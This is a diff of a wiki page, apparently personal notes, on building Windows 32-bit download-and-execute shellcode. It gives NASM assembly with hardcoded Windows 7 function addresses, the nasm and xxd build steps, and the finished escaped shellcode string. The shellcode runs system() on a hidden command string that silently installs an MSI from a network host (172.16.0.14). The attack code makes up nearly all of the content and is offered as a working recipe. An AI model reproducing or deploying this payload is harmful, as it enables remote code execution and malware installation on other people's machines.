@@ -1,4 +1,4 @@
-# *Note.... **I hate formatting wikis**
+
 
 https://web.archive.org/web/20120503030935/http://projectshellcode.com/?q=node/12
 
@@ -15,67 +15,40 @@ https://iamroot.blog/2019/01/28/windows-shellcode-download-and-execute-payload-u
 
 4. Need to Determine LoadLibrary, ExitProcess & System via Arwin
 
-
+```
 ------------assembly starts---------------
 
 BITS 32
-
-
 global _start
-
-
 _start:
 			
 mov ebx, 0x777fde35      		;Address of function LoadLibraryA (win7)
-
 call ebx
-
 mov ebp, eax             		;msvcrt.dll is saved in ebp
-
 xor eax, eax
-
 PUSH eax
-
 PUSH 0x6e712f20
-
 PUSH 0x69736d2e
-
 PUSH 0x6d6e6f73
-
 PUSH 0x616a2f34
-
 PUSH 0x312e302e
-
 PUSH 0x36312e32
-
 PUSH 0x37312f2f
-
 PUSH 0x3a707474
-
 PUSH 0x6820692f
-
 PUSH 0x20636578
-
 PUSH 0x6569736d
-
 MOV EDI,ESP
-
 PUSH EDI
-
 MOV EAX, 0x768db177			;calling the system()
-
 CALL EAX
-
 xor eax, eax
-
 push eax
-
 mov eax, 0x7780be5a     		; ExitProcess
-
 call eax
 
 --------------assembly end----------------------------------
-
+```
 5. Save as msi.asm
 
 6. Using Cygwin
@@ -84,6 +57,7 @@ call eax
 $ nasm -f win32 msi.asm -o msi.bin
 
 8.xvz@xvz-PC ~
+```
 $ xxd -i msi.bin
 unsigned char msi_bin[] = {
   0x4c, 0x01, 0x01, 0x00, 0x2e, 0x4c, 0x0f, 0x5f, 0x93, 0x00, 0x00, 0x00,
@@ -109,14 +83,14 @@ unsigned char msi_bin[] = {
   0x61, 0x74, 0x2e, 0x30, 0x30, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00,
   0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x00
 };
-
+```
 8.Get rid of null bytes
 
 9.xvz@xvz-PC ~
 $ ./xxd-shellcode.sh msi.bin
-
+```
 "\xbb\x35\xde\x7f\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x73\x6f\x6e\x6d\x68\x34\x2f\x6a\x61\x68\x2e\x30\x2e\x31\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x37\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x8d\x76\xff\xd0\x31\xc0\x50\xb8\x5a\xbe\x80\x77\xff\xd0"
-
+```
 10.Add to script
 
 11.Create MSI
